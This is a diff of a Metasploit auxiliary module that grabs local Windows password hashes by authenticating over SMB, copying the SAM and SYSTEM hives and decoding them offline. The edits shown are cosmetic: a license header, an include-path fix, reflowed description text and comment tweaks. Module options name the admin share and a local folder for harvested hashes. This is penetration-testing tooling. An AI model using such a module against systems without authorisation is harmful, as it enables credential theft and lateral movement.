@@ -1,34 +1,43 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
+##
+
 require 'msf/core'
 require 'rex/registry'
 require 'fileutils'
-require 'msf/core/exploit/psexec'
+#require 'msf/core/exploit/psexec'
 
 class Metasploit3 < Msf::Auxiliary
 
 	# Exploit mixins should be called first
 	include Msf::Exploit::Remote::DCERPC
 	include Msf::Exploit::Remote::SMB
-	include Msf::Exploit::Remote::Psexec
+	include Msf::Exploit::Remote::SMB::Psexec
 	include Msf::Exploit::Remote::SMB::Authenticated
 	include Msf::Auxiliary::Report
 	include Msf::Auxiliary::Scanner
-
 	# Aliases for common classes
 	SIMPLE = Rex::Proto::SMB::SimpleClient
 	XCEPT = Rex::Proto::SMB::Exceptions
 	CONST = Rex::Proto::SMB::Constants
 
+
 	def initialize
 		super(
 			'Name'        => 'SMB - Grab Local User Hashes',
 			'Description' => %Q{
-				This module extracts local user account password hashes from the SAM and SYSTEM hive files by authenticating
-				to the target machine and downloading a copy of the hives.  The hashes are extracted offline on the attacking machine.  This all happenes without popping a shell or uploading
+				This module extracts local user account password hashes from the 
+				SAM and SYSTEM hive files by authenticating to the target machine and 
+				downloading a copy of the hives.  The hashes are extracted offline on 
+				the attacking machine.  This all happenes without popping a shell or uploading
 				anything to the target machine.  Local Admin credentials (password -or- hash) are required
 			},
 			'Author'      =>
 				[
-					'Royce @R3dy__ Davis <rdavis[at]accuvant.com>',    # Metasploit module
+					'Royce Davis <rdavis[at]accuvant.com>',    # @R3dy__
 				],
 			'References'  => [
 				['URL', 'http://sourceforge.net/projects/smbexec/'],
@@ -36,7 +45,6 @@ class Metasploit3 < Msf::Auxiliary
 			],
 			'License'     => MSF_LICENSE
 		)
-
 		register_options([
 			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
 			OptString.new('LOGDIR', [true, 'This is a directory on your local attacking system used to store Hive files and hashes', '/tmp/msfhashes/local']),
@@ -44,7 +52,6 @@ class Metasploit3 < Msf::Auxiliary
 			OptString.new('WINPATH', [true, 'The name of the WINDOWS directory on the remote host', 'WINDOWS']),
 			OptString.new('SYSDRIVE', [true, 'The root drive letter on the remote host', 'C:']),
 		], self.class)
-
 		deregister_options('RHOST')
 	end
 
@@ -143,7 +150,7 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 
-	# This method taken from tools/reg.rb  thanks bperry for all of your efforts!!
+	# This method was taken from tools/reg.rb  thanks bperry for all of your efforts!!
 	def get_boot_key(hive)
 		begin
 			return if !hive.root_key
@@ -406,6 +413,5 @@ class Metasploit3 < Msf::Auxiliary
 		end
 		return key.pack("<C*")
 	end
-
 
 end
